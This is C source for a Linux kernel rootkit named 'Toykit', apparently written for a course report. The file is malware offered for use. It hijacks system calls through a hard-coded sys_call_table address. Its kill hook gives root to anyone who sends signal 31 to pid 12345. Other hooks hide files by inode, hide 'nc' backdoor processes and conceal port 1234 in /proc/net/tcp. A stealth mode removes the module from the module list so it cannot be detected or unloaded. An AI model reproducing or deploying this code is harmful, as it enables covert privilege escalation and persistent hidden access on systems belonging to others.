#include <asm/unistd.h>
#include <linux/highmem.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/fdtable.h>

// USAGE
// DYNAMIC COMMANDS (AFTER MODULE LOAD TIME)
// kill -31 12345 gives root access
// kill -16 [some_inode] hides a file with inode some_inode

// STATIC COMMANDS (BEFORE MODULE LOAD TIME)
// process hiding -- HIDE_PROC will not be visible to user
// port hiding -- HIDE_PORT will not be visible to user

// STEALTH MODE 
// rootkit is invisible and unremovable
// comment out STEALTH_MODE to turn off
// EGASU

// for root-access backdoor
// kill -31 12345 gives root access
#define ROOT_PID 12345
#define ROOT_SIG 31

// for controlling the file hider
// kill -16 [some_inode] hides a file with inode some_inode
#define HIDE_SIG 16

// for process hiding
// nc is hidden for remote backdoor
#define HIDE_PROC "nc"

// for port hiding
#define HIDE_PORT "04D2" // 1234 in hex

// for hiding from lsmod
#define STEALTH_MODE 1 // comment out if you want to remove toykit

// for writing to sys_call_table
// CITATION [6] from report
#define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000))
#define GPF_ENABLE write_cr0(read_cr0() | 0x10000)

// hard coded, grep /boot/System.map
// sys_call_table is no longer an exported symbol
unsigned long *sys_call_table = (unsigned long*) 0xc15b0000;

// hijacking sys_kill -- 1. root-access backdoor, 2. hide inodes
// CITATION [4] from report
typedef asmlinkage int (*kill_ptr)(pid_t pid, int sig);
kill_ptr orig_kill;

// list of inodes to hide
static LIST_HEAD(hidden_files); 

// struct for list of inodes
struct hidden_file { 
	unsigned long long inode;
	struct list_head list;
};

asmlinkage int hacked_kill(pid_t pid, int sig)
{
	int actual_result;
	struct hidden_file *toAdd;

	// root-access backdoor
	// CITATION [6] from report
	if (pid == ROOT_PID && sig == ROOT_SIG) {
		struct cred *cred;
		cred = (struct cred *) __task_cred(current);
		cred->uid = 0;
		cred->gid = 0;
		cred->suid = 0;
		cred->sgid = 0;
		cred->euid = 0;
		cred->egid = 0;
		cred->fsuid = 0;
		cred->fsgid = 0;
		return 0;
	}
	// file hiding
	// pid = inode of file to be hidden
	else if (sig == HIDE_SIG) { 
		toAdd = kmalloc(sizeof(struct hidden_file),GFP_KERNEL);
		toAdd->inode = (unsigned long long) pid;
		INIT_LIST_HEAD(&toAdd->list);
		list_add_tail(&toAdd->list,&hidden_files);
		return 0;
	}

	actual_result = (*orig_kill)(pid,sig);
	return actual_result;
}

// for hijacking sys_getdents -- 1. file hiding, 2. process hiding
struct linux_dirent {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	char d_name[256];
	char pad;
	char d_type;
};

// for proc hiding, checking a process name against the HIDE_PROC constant
int checkProcName(long pid)
{
	if (strcmp(pid_task(find_vpid(pid),PIDTYPE_PID)->comm,HIDE_PROC) == 0)
		return 1;
	return 0;
}

typedef asmlinkage int (*getdents_ptr)(unsigned int fd, struct linux_dirent *dirp,
                                       unsigned int count);
getdents_ptr orig_getdents;

asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp,
                               unsigned int count)
{
	int result, bp; // bp = position in bytes in kdirp
	struct hidden_file *ptr;
	char *kdirp; // char buffer so we can do pointer arithmetic by byte
	struct linux_dirent *d;

	struct files_struct *current_files; 
	struct fdtable *files_table;
	struct path file_path;
	char pbuf[256], *pathname = NULL;
	long pid = 0;

	// run real getdents 
	result = (*orig_getdents)(fd,dirp,count);
	if (result <= 0)
		return result;

	// get pathname
	// CITATION [8] from report
	current_files = current->files;
	files_table = files_fdtable(current_files);

	file_path = files_table->fd[fd]->f_path;
	pathname = d_path(&file_path,pbuf,256*sizeof(char));

	// copy from user to kernelspace;
	if (!access_ok(VERIFY_READ,dirp,result))
		return EFAULT;
	if ((kdirp = kmalloc(result,GFP_KERNEL)) == NULL)
		return EINVAL;
	if (copy_from_user(kdirp,dirp,result))
		return EFAULT;

	// check dirp for files to hide
	for (bp = 0; bp < result; bp += d->d_reclen) {
		d = (struct linux_dirent *) (kdirp + bp);
		// process hiding
		if (!strcmp(pathname,"/proc")) { // if in /proc
			kstrtol(d->d_name,10,&pid);
			if ((pid > 0) && checkProcName(pid)) { // if proc virtual file
				memmove(kdirp + bp,kdirp + bp + d->d_reclen, // del dirent
					result - bp - d->d_reclen);
				result -= d->d_reclen;
				bp -= d->d_reclen;
			}
		}
		// file hiding
		else { // check inodes against list of inodes to hide
			list_for_each_entry(ptr,&hidden_files,list) {
				if (d->d_ino == ptr->inode) {
					memmove(kdirp + bp,kdirp + bp + d->d_reclen, // del dirent
						result - bp - d->d_reclen);
					result -= d->d_reclen;
					bp -= d->d_reclen;
				}
			}
		}
	}

	// copy from kernel to userspace
	if (!access_ok(VERIFY_WRITE,dirp,result))
		return EFAULT;
	if (copy_to_user(dirp,kdirp,result))
		return EFAULT;
	kfree(kdirp);

	// return number of bytes read
	return result;
}

typedef asmlinkage int (*getdents64_ptr)(unsigned int fd, struct linux_dirent64 *dirp,
                                         unsigned int count);
getdents64_ptr orig_getdents64;

asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
                                 unsigned int count)
{
	int result, bp; // bp = position in bytes in kdirp
	struct hidden_file *ptr;
	char *kdirp; // char buffer so we can do pointer arithmetic by byte
	struct linux_dirent64 *d;

	struct files_struct *current_files; 
	struct fdtable *files_table;
	struct path file_path;
	char pbuf[256], *pathname = NULL;
	long pid = 0;

	// run real getdents 
	result = (*orig_getdents64)(fd,dirp,count);
	if (result <= 0)
		return result;

	// get pathname
	// CITATION [8] from report
	current_files = current->files;
	files_table = files_fdtable(current_files);

	file_path = files_table->fd[fd]->f_path;
	pathname = d_path(&file_path,pbuf,256*sizeof(char));

	// copy from user to kernelspace;
	if (!access_ok(VERIFY_READ,dirp,result))
		return EFAULT;
	if ((kdirp = kmalloc(result,GFP_KERNEL)) == NULL)
		return EINVAL;
	if (copy_from_user(kdirp,dirp,result))
		return EFAULT;

	// check dirp for files to hide
	for (bp = 0; bp < result; bp += d->d_reclen) {
		d = (struct linux_dirent64 *) (kdirp + bp);
		// process hiding
		if (!strcmp(pathname,"/proc")) { // if in /proc
			kstrtol(d->d_name,10,&pid);
			if ((pid > 0) && checkProcName(pid)) { // if proc virtual file
				memmove(kdirp + bp,kdirp + bp + d->d_reclen, // del dirent
					result - bp - d->d_reclen);
				result -= d->d_reclen;
				bp -= d->d_reclen;
			}
		}
		// file hiding
		else { // check inodes against list of inodes to hide
			list_for_each_entry(ptr,&hidden_files,list) {
				if (d->d_ino == ptr->inode) {
					memmove(kdirp + bp,kdirp + bp + d->d_reclen, // del dirent
						result - bp - d->d_reclen);
					result -= d->d_reclen;
					bp -= d->d_reclen;
				}
			}
		}
	}

	// copy from kernel to userspace
	if (!access_ok(VERIFY_WRITE,dirp,result))
		return EFAULT;
	if (copy_to_user(dirp,kdirp,result))
		return EFAULT;
	kfree(kdirp);

	// return number of bytes read
	return result;
}

// for hijacking sys_read -- 1. port hiding
typedef asmlinkage long (*read_ptr)(unsigned int fd, char __user *buf,
                                    size_t count);
read_ptr orig_read;

// CITATION [7] from report
asmlinkage long hacked_read(unsigned int fd, char __user *buf,
                            size_t count)
{
	long result, bp, diff_in_bytes;
	char *kbuf, *start_line, *end_line, *port_num;
	char *pathname, pbuf[256];
	struct files_struct *current_files; 
	struct fdtable *files_table;
	struct path file_path;

	// run real read 
	result = (*orig_read)(fd,buf,count);
	if (result <= 0)
		return result;

	// get pathname
	// CITATION [8] from report
	current_files = current->files;
	files_table = files_fdtable(current_files);

	file_path = files_table->fd[fd]->f_path;
	pathname = d_path(&file_path,pbuf,256*sizeof(char));

	// if virtual file /proc/net/tcp
	if (!strncmp(pathname,"/proc/",6) && !strcmp(pathname+10,"/net/tcp")) {
		// copy from user to kernelspace;
		if (!access_ok(VERIFY_READ,buf,result))
			return -1;
		if ((kbuf = kmalloc(result,GFP_KERNEL)) == NULL)
			return -1;
		if (copy_from_user(kbuf,buf,result))
			return -1;

		// filter out hidden ports
		start_line = strchr(kbuf,':') - 4; // skip first line
		diff_in_bytes = (start_line - kbuf) * sizeof(char);
		for (bp = diff_in_bytes; bp < result; bp += diff_in_bytes) {
			start_line = kbuf + bp;
			port_num = strchr(strchr(start_line,':') + 1,':') + 1;
			end_line = strchr(start_line,'\n');
			diff_in_bytes = ((end_line - start_line) + 1) * sizeof(char);
			if (!strncmp(port_num,HIDE_PORT,4)) { // if magic port
				memmove(start_line,end_line + 1, // delete line in file
					result - bp - diff_in_bytes);
				result -= diff_in_bytes;
			}
		}

		// copy from kernel to userspace
		if (!access_ok(VERIFY_WRITE,buf,result))
			return EINVAL;
		if (copy_to_user(buf,kbuf,result))
			return EINVAL;
		kfree(kbuf);
	}


	// return number of bytes read
	return result;
}

int rootkit_init(void) {
#ifdef STEALTH_MODE
	struct module *self;
#endif

	GPF_DISABLE; // make the sys_call_table_readable
	orig_kill = (kill_ptr)sys_call_table[__NR_kill]; // hooking
	sys_call_table[__NR_kill] = (unsigned long) hacked_kill;

	orig_getdents = (getdents_ptr)sys_call_table[__NR_getdents];
	sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;

	orig_getdents64 = (getdents64_ptr)sys_call_table[__NR_getdents64];
	sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;

	orig_read = (read_ptr)sys_call_table[__NR_read];
	sys_call_table[__NR_read] = (unsigned long) hacked_read;
	GPF_ENABLE;

#ifdef STEALTH_MODE
	// hide from lsmod, impossible to remove
	mutex_lock(&module_mutex);
	if ((self = find_module("toykit")))
		list_del(&self->list);
	mutex_unlock(&module_mutex);
#endif

	printk(KERN_INFO "Loading rootkit\n");
    	return 0;
}

void rootkit_exit(void) {
	struct hidden_file *ptr, *next;

	GPF_DISABLE; // make the sys_call_table_readable
	sys_call_table[__NR_kill] = (unsigned long) orig_kill;
	sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
	sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
	sys_call_table[__NR_read] = (unsigned long) orig_read;
	GPF_ENABLE;

	// delete list of inodes
	list_for_each_entry_safe(ptr,next,&hidden_files,list) {
		list_del(&ptr->list);
		kfree(ptr);
	}
	printk(KERN_INFO "Removing rootkit\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Toykit");
MODULE_AUTHOR("Josh Imhoff");
